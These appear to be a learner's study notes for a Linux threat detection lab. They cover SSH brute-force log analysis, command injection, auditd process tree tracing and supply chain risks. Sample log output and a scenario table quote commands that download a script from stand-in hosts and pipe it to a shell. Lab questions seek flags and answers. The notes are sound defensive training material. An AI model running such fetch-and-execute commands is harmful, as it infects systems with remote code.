# Linux Threat Detection

## Initial Access via SSH

[External Remote Services](https://attack.mitre.org/techniques/T1133/) MiTRE Technique  

Threat actors run botnets to scan for exposed SSH and weak passwords authentication methods  

### Common Risks Using key-based authentication

- storage of private ssh keys on publicly available source code repositories or other services (Github, Ansible automation server)  
- Theft of SSH keys by infecting an admin laptop with data stealer malware  

### Additional Risks associated with Passowrd-based authentication

- admin sets a weak admin password for a temporary test, and forgets to revert changes or eliminate the account
- IT support enables ssh support for a contractor who sets a weak password
- Exposure of old, insecure SSH server to the intenet  

**Additional Material**

[Outlaw Group Uses SSH Brute-Force to Deploy Cryptojacking Malware on Linux Servers](https://thehackernews.com/2025/04/outlaw-group-uses-ssh-brute-force-to.html#:~:text=Outlaw%20is%20a%20Linux%20malware%20that%20relies%20on%20SSH%20brute%2Dforce%20attacks)  
[Remote Service Session Hijacking: SSH Hijacking ](https://attack.mitre.org/techniques/T1563/001/)  

**Initial Access via SSH Questions**

When did the ubuntu user log in via SSH for the first time?

`:> grep ubuntu /var/log/auth.log | grep login`

Did the ubuntu user use SSH keys instead of a password for the above found date? (Yea/Nay)  

`:> grep sshd auth.log | grep ubuntu | head`  

```bash
Accepted publickey for ubuntu from 10.9.254.186 port 64824 ssh2: RSA SHA256:krhp4o9yYOyVKmAd7PAsdHrKQGJtjIQjt4w0K9R4kXg
```

### Detecting SSH Attacks

#### Common Scenario

1. An adminitrative account enables public SSH access
2. The administrator enables passowrd-based authentication
3. the administrator sets a weak passowrd

#### Indicators of Compromise

1. Failed SSH login attempts by a user
2. Successful login attempts by the same user  
3. Is the source IP trusted/untrusted and/or internal/external?
4. Login method (password)
5. Do logins demonstrate potentila brute force attempt
6. time of day is expected / unexpected


**Detect SSH Attack Questions**

When did the SSH password brute force start?
Answer Format: 2023-09-15.

`grep -i failed auth.log | grep -i password`

Which four users did the botnet attempt to breach?
Answer Format: Separate by a comma, in alphabetical order.  

`grep -i failed auth.log | grep -i password`

Finally, which IP managed to breach the root user?  

`:> grep -i accepted auth.log | grep -i root`  



## Initial Access via Servcies

[T1190: Exploit Public-Facing Application ](https://attack.mitre.org/techniques/T1190/)  

Public-facing services include webservers, email servers, databases, and development/management tools.  

### T1190 Examples

[WordPress Admin Shell Upload](https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_admin_shell_upload/)  
[Threat Brief: Operation MidnightEclipse, Post-Exploitation Activity Related to CVE-2024-3400](https://unit42.paloaltonetworks.com/cve-2024-3400/)  
[TeamTNT’s Docker Gatling Gun Campaign](https://www.aquasec.com/blog/threat-alert-teamtnts-docker-gatling-gun-campaign/#:~:text=The%20campaign%20gains%20initial%20access%20by%20exploiting%20exposed%20Docker%20daemons)  
[Researchers Warn of Ongoing Attacks Exploiting Critical Zimbra Postjournal Flaw](https://thehackernews.com/2024/10/researchers-sound-alarm-on-active.html)  

### Using Logs  

Application logs rarely contain sufficient information to identify actual breach.  

- web logs can show a variety of web attcks
- database logs show suspicious queries (SQL or NoSQL)
- VPN logs contain abnormal VPN login events
- other specific logs contain information on specific events

### Web as Initila Access

Un sanitized input fields allow threat actors to attach linux commands inside query statements (command injection)  

indicators include:  

- source IP
- query strings which contain unexpected or unusual strings (such as commands)  

**Services Attacks Questions**

What is the path to the Python file the attacker attempted to open?  

`:> grep .py access.log`  

Looking inside the opened file, what's the flag you see there?

`:> cat ....`

### Detecting Service Breach

#### Process Tree Analysis

[SeleniumGreed: Threat actors exploit exposed Selenium Grid services for Cryptomining](https://www.wiz.io/blog/seleniumgreed-cryptomining-exploit-attack-flow-remediation-steps)  

Receive and alert and build a process tree back to its parent process  

![process-tree-analysis](assets/threat-detection-101.svg)  

#### Auditd and Process Tree

Locate suspicious commands in logs with `:> ausearch -i -x <command>`

`-i` : interpret numeric entities into text
`-x` : search for an event matching the given `<command>` executable name  

```bash
ubuntu@thm-vm:~$ ausearch -i -x whoami # -x filters the results by the command name
type=PROCTITLE msg=audit(08/25/25 16:28:18.107:985) : proctitle=whoami
type=SYSCALL msg=audit(08/25/25 16:28:18.107:985) : syscall=execve success=yes exit=0 items=2 ppid=3905 pid=3907 auid=unset uid=ubuntu tty=(none) exe=/usr/bin/whoami key=exec
```

use `--pid` option until you walk the complete tree to PID 1, the OS process  

```bash
ubuntu@thm-vm:~$ ausearch -i --pid 3905 # 3905 is a parent process ID of whoami
type=PROCTITLE msg=audit(08/25/25 16:28:17.101:983) : proctitle=/bin/sh -c whoami
type=SYSCALL msg=audit(08/25/25 16:28:17.101:983) : syscall=execve success=yes exit=0 items=2 **ppid=3898** pid=3905 auid=unset uid=ubuntu tty=(none) exe=/usr/bin/dash key=exec

ubuntu@thm-vm:~$ ausearch -i --pid 3898 # 3898 is a grandparent process ID of whoami
type=PROCTITLE msg=audit(08/25/25 16:28:11.727:982) : proctitle=/usr/bin/python3 /opt/mywebapp/app.py
type=SYSCALL msg=audit(08/25/25 16:28:11.727:982) : syscall=execve success=yes exit=0 items=2 **ppid=1-- pid=3898 auid=unset uid=ubuntu tty=(none) exe=/usr/bin/python3.12 key=exec
```

PID 1 belongs to `app.py`  

List the child process of `app.py`  

```bash
ubuntu@thm-vm:~$ ausearch -i --ppid 3898 | grep 'proctitle' # Use grep for a simpler output
type=PROCTITLE msg=audit(08/25/25 16:28:17.101:983) : proctitle=/bin/sh -c whoami
type=PROCTITLE msg=audit(08/25/25 16:28:18.230:985) : proctitle=/bin/sh -c ls -la
type=PROCTITLE msg=audit(08/25/25 16:28:19.765:987) : proctitle=/bin/sh -c curl http://17gs9q1puh8o-bot.thm | sh
```

**Detect Service Attacks Questions**  

What is the PPID of the suspicious whoami command?

`:> ausearch -i -x whoami | grep -i ppid`  

Moving up the tree, what is the PID of the TryPingMe app?

`:> ausearch -i --pid 1018`  

note: identify the `cwd` which has `trypingme` in the value  

Which program did the attacker use to open a reverse shell?

Find all child process of the previous answer.  

## Advanced Initial Access

### Human-Led Attacks

| Scenario Example | Consequences |
|-----------------|--------------|
| An IT member looks for a solution to a server issue and desperately tries this script found in a forum: `curl https://shadyforum.thm/fix.sh | bash` | The IT member didn't check the script content, and it appeared to be malware, silently infecting the server ([Read more](https://www.schneier.com/blog/archives/2022/11/an-untrustworthy-tls-certificate-in-browsers.html)) |
| A developer wants to install a Python "fastapi" package on the server, but mistypes a single letter: `pip3 install fastpi` | The mistyped package was malware, deliberately prepared and published by threat actors ([Real-world case](https://thehackernews.com/2025/03/malicious-pypi-packages-stole-cloud.html)) |

### Supply Chain Compromise

Dependencies are infects and pass the infection on.  

- A [backdoor in the XZ Utils library](https://www.akamai.com/blog/security-research/critical-linux-backdoor-xz-utils-discovered-what-to-know) that is a part of SSH nearly led to a breach of millions of Linux servers  
- A [breach of the tj-actions](https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-tj-actionschanged-files-cve-2025-30066-and-reviewdogaction) resulted in a leak of thousands of secrets, like SSH keys and access tokens  

### Detecting The Attacks

Relies on process tree analysis

**Questions**

Which Initial Access technique is likely used if a trusted app suddenly runs malicious commands?

Which detection method can you use to detect a variety of Initial Access techniques?